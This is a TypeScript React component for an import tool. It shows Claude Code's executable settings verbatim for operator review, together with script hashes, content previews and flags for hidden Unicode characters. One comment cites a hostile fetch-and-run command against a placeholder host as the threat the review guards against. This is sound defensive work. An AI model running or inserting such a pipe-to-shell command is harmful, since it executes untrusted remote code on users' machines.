// SPDX-License-Identifier: AGPL-3.0-only
import type {
  ExecutableScriptReview,
  ImportGroups,
  ImportPlanSummary,
  ImportResult,
} from "@/types/porter";
import { isModeRowExcluded, isSettingsScriptHeld } from "./ImportHooksReview";
import {
  HiddenCharsNotice,
  SettingValue,
  settingValueText,
  VisibleText,
} from "./VisibleText";

/**
 * #2565 (F5) + #4173 — the executable-settings review, split out of
 * PorterImportPanel.tsx (its 1,500-line max-lines cap, #2077). The VALUES of
 * `apiKeyHelper` / `statusLine` (the settings Claude Code runs as shell
 * commands) are surfaced verbatim, and under each value the files it runs: the
 * path, the full sha256, what the import does with it, and a content preview.
 * Every value and preview is inert text, never executed or rendered as HTML.
 *
 * #5195: every key, value, path, and preview renders through `VisibleText`, so
 * a hidden or direction-changing code point (the Trojan Source pattern in a
 * script preview) shows in place as a `U+XXXX` token, and the list carries one
 * notice when any value contains one.
 */

/** A destPath relative to the config root when it lives under it. */
const relTo = (claudeDir: string, p: string): string =>
  p.startsWith(`${claudeDir}/`) ? p.slice(claudeDir.length + 1) : p;

/** A non-string setting value renders as multi-line JSON (#5195). */
const isMultiline = (v: unknown): boolean => typeof v !== "string";

/** `<settings.json>#statusLine` → `statusLine`. */
const keyOf = (gate: string): string => gate.split("#").pop() ?? gate;

function ScriptRow({
  row,
  claudeDir,
  overwrite,
  excluded,
  groups,
  testId,
}: {
  row: ExecutableScriptReview;
  claudeDir: string;
  overwrite: ReadonlySet<string>;
  excluded: ReadonlySet<string>;
  groups: ImportGroups;
  testId: string;
}) {
  const path = row.destPath ? relTo(claudeDir, row.destPath) : row.reference;
  return (
    <li data-testid={testId} className="flex flex-col gap-0.5 pl-3">
      <span>
        runs{" "}
        <span className="font-mono break-all">
          <VisibleText text={path} />
        </span>
        {row.status === "carried" &&
          row.kind &&
          row.kind !== "settings-script" && (
            <span className="text-[var(--app-hint)]">
              {" "}
              (via {row.kind === "hook-lib" ? "hooks" : row.kind})
            </span>
          )}
      </span>
      {row.status === "carried" && (
        <>
          <span className="font-mono break-all text-[var(--app-hint)]">
            sha256:{row.sha256}
          </span>
          {row.conflict === "differs" && (
            <span>
              A different file is already there; it is kept unless you overwrite
              it in the conflicts below.
            </span>
          )}
          {row.conflict === "exists" && (
            <span className="text-[var(--app-hint)]">
              Already on this machine with the same content.
            </span>
          )}
          {isSettingsScriptHeld(row, overwrite) && (
            <span data-testid={`${testId}-held`}>
              Not written unless you overwrite{" "}
              {(row.gatedBy ?? []).map((g, i) => (
                <span key={g}>
                  {i > 0 && " or "}
                  <span className="font-mono">{keyOf(g)}</span>
                </span>
              ))}{" "}
              in the conflicts below.
            </span>
          )}
          {row.kind &&
            row.destPath &&
            row.kind !== "settings-script" &&
            isModeRowExcluded(
              { destPath: row.destPath, kind: row.kind },
              excluded,
              groups
            ) && (
              <span data-testid={`${testId}-deselected`}>
                Excluded by your hook selection — the command will run a missing
                file.
              </span>
            )}
          {row.preview && (
            <details>
              <summary className="cursor-pointer text-[var(--app-hint)]">
                Content
                {row.preview.truncated && !row.preview.binary
                  ? " (truncated)"
                  : ""}
              </summary>
              {row.preview.binary ? (
                <p className="text-[var(--app-hint)]">Binary, not shown.</p>
              ) : (
                <pre
                  data-testid={`${testId}-preview`}
                  className="max-h-64 overflow-auto whitespace-pre-wrap break-all font-mono text-[var(--app-fg)]"
                >
                  <VisibleText text={row.preview.text} multiline />
                </pre>
              )}
            </details>
          )}
        </>
      )}
      {row.status === "on-destination" && (
        <span className="text-[var(--app-hint)]">
          Already on this machine (not in the archive).
        </span>
      )}
      {row.status === "missing" && (
        <span>
          Not in the archive and not on this machine — the command will fail.
        </span>
      )}
      {row.status === "not-carried" && (
        <span className="text-[var(--app-hint)]">{row.reason}</span>
      )}
    </li>
  );
}

/**
 * #2565 (F5): the VALUES of executable settings keys (apiKeyHelper,
 * statusLine) — the subset Claude Code runs as shell commands — surfaced
 * VERBATIM for review. A values-blind review shows only the key name, so
 * `apiKeyHelper` could smuggle `curl evil.sh | sh` past the operator.
 * Warning-styled (amber) like env/permissions; inert monospace text, never
 * executed here. #4173: each value lists the files it runs.
 */
export function ExecutableSettingsReview({
  settings,
  claudeDir,
  overwrite,
  excluded,
  groups,
}: {
  settings: ImportPlanSummary["settings"];
  claudeDir: string;
  overwrite: ReadonlySet<string>;
  excluded: ReadonlySet<string>;
  groups: ImportGroups;
}) {
  if (settings.executableValues.length === 0) return null;
  return (
    <div className="mt-1" data-testid="executable-settings">
      <p className="text-[length:var(--text-body-dense)] font-medium text-warn">
        ⚠ Executable — Claude Code runs these:
      </p>
      <HiddenCharsNotice
        testId="executable-settings-hidden-chars"
        values={[
          ...settings.executableValues
            .filter(ev => !isMultiline(ev.value))
            .map(ev => settingValueText(ev.value)),
          ...settings.executableScripts.flatMap(r => [
            r.reference,
            r.destPath ?? "",
          ]),
        ]}
        multilineValues={[
          ...settings.executableValues
            .filter(ev => isMultiline(ev.value))
            .map(ev => settingValueText(ev.value)),
          // The preview sits in a collapsed <details>, so the notice is the
          // only signal of a hidden code point there until it is opened.
          ...settings.executableScripts.map(r =>
            r.preview && !r.preview.binary ? r.preview.text : ""
          ),
        ]}
      />
      <ul className="flex flex-col gap-0.5 text-[length:var(--text-body-dense)] text-warn">
        {settings.executableValues.map(ev => {
          const rows = settings.executableScripts.filter(r => r.key === ev.key);
          return (
            <li key={ev.key}>
              <span className="font-mono">
                <VisibleText text={ev.key} />
              </span>
              {" = "}
              <span className="font-mono break-all whitespace-pre-wrap">
                <SettingValue value={ev.value} />
              </span>
              {rows.length > 0 && (
                <ul className="flex flex-col gap-1 pt-0.5">
                  {rows.map((row, i) => (
                    <ScriptRow
                      key={`${row.reference}#${i}`}
                      row={row}
                      claudeDir={claudeDir}
                      overwrite={overwrite}
                      excluded={excluded}
                      groups={groups}
                      testId={`executable-script-${ev.key}-${i}`}
                    />
                  ))}
                </ul>
              )}
            </li>
          );
        })}
      </ul>
    </div>
  );
}

/** #4173 (D4): the post-commit list of scripts held back with their setting. */
export function SettingsScriptsHeldList({
  result,
}: {
  result: Pick<ImportResult, "settingsScriptsHeld" | "claudeDir">;
}) {
  if (result.settingsScriptsHeld.length === 0) return null;
  return (
    <div>
      <h3 className="pb-1 text-[length:var(--text-caption)] font-semibold uppercase tracking-wide text-[var(--app-hint)]">
        Scripts not written (their setting was kept)
      </h3>
      <ul className="flex flex-col gap-0.5" data-testid="settings-scripts-held">
        {result.settingsScriptsHeld.map(h => (
          <li
            key={h.destPath}
            className="text-[length:var(--text-body-dense)] text-[var(--app-fg)]"
          >
            <span className="font-mono break-all">
              {relTo(result.claudeDir, h.destPath)}
            </span>
            <span className="text-[var(--app-hint)]">
              {" "}
              — kept setting: {h.keys.map(keyOf).join(", ")}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
}
